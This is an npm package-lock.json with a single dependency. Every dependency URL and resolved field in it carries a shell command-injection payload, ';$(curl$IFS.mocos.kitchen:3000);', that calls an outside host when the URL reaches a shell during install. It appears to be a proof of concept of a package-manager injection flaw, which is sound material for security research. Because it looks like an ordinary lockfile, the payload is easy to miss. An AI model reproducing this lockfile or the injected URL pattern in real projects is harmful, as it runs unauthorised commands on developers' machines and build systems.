{
  "name": "javascript",
  "version": "1.0.0",
  "lockfileVersion": 2,
  "requires": true,
  "packages": {
    "": {
      "version": "1.0.0",
      "license": "MIT",
      "dependencies": {
        "tyage-sample-package": "ssh+https://;$(curl$IFS.mocos.kitchen:3000);@github.com/tyage/sample-package#semver:5.0.5"
      }
    },
    "node_modules/tyage-sample-package": {
      "resolved": "ssh+https:/;$(curl$IFS.mocos.kitchen:3000);@github.com/tyage/sample-package#328f1503a094bd444931a16ba0bf3bc5acc02aa3",
      "link": true
    },
    "ssh+https:/;$(curl$IFS.mocos.kitchen:3000);@github.com/tyage/sample-package#328f1503a094bd444931a16ba0bf3bc5acc02aa3": {}
  },
  "dependencies": {
    "tyage-sample-package": {
      "version": "file:ssh+https:/;$(curl$IFS.mocos.kitchen:3000);@github.com/tyage/sample-package#328f1503a094bd444931a16ba0bf3bc5acc02aa3"
    }
  }
}
